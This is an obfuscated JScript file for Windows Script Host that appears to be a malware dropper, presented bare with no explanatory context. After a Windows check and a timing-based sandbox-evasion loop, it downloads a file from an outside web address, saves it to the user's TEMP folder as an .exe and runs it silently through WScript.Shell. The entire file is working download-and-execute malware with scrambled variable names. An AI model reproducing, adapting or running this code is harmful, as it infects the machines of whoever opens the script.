var _GK = false;
var _B0 = "CreateObject";
var _IX = function _J() {return WScript[_B0]("WScript"+".Shell");}(), _J0 = 11;
var _G1 = "MSXML2.XMLHTTP";
var _PJ = 2123213;
var _CE = 0;
function _IO(_YO){_IX["Run"](_YO, _CE, _CE);};
function _QK(){return _G1 + "";};
function _M(_T, _U){_CE = _CE * 1; return _T - _U;};
function _E(){return _B0;};
/*@cc_on
  @if (@_win32 || @_win64)
    _GK = true;
  @end
@*/
if (_GK)
{
var _EC = "";
function _GR(){return 22;};
var _H0 = 0; var _KU = 0;
function _VG()
{
var _W = new this["Date"]();
var _JM = _W["getUTCMilliseconds"]();
WScript["Sleep"](_GR());
var _W = new this["Date"]();
var _ZM = _W["getUTCMilliseconds"]();
WScript["Sleep"](_GR());
var _W = new this["Date"]();
var _ZH = _W["getUTCMilliseconds"]();
var _H0 = "_ZU";
_H0 = _M(_ZM, _JM);
var _KU = "_JR";
_KU = _M(_ZH, _ZM);
_EC = "open";
return _M(_H0, _KU);
}
var _A0 = false;
var _Z = false;
for (var _K = _CE; _K < _GR() * 1; _K++){if (_VG() != _CE){
_A0 = true; 
_KU = "31" + 11 * _H0 + _KU; 
_Z = true; 
break;
}}
function _G() {return ((_A0 == true) && (_A0 == _Z)) ? 1 : _CE;};
if (_A0 && _G() && _Z){
function _IP() {return _IX["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "QeBg71UnZ5Kevk.ex" + "e";};
 _EU = _QK();
 _EB = WScript[_B0](_EU);
 var _B = 1;
 while (_B){
try {
	if (_B == 1)
	{
		_EB[_EC]("GET", "http://itead-europe.com/k3ias", false);
		_EB["send"]();
		_A = "Sleep";
	}
	WScript[_A](_GR() + 120); 
	if (_EB["readystate"] < 2 * 2) continue;
	_B = _CE;
	function _FL(_H) {var _G0 = (1, 2, 3, 4, 5, _H); return _G0;};
	_R = WScript[_E()]("ADODB.Stream");
	_EU = _R;
	_EU[_EC]();
	_EU["type"] = _FL(1);
	_EU["write"](_EB["ResponseBody"]);
	_R["position"] = _FL(_CE);
	_EU["Save" + "ToFile"](_IP(), 2);
	_R["cl"+"ose"]();
	_IH = _IP();
	_IO(_IH);
} catch(_MN){};
}
}
}

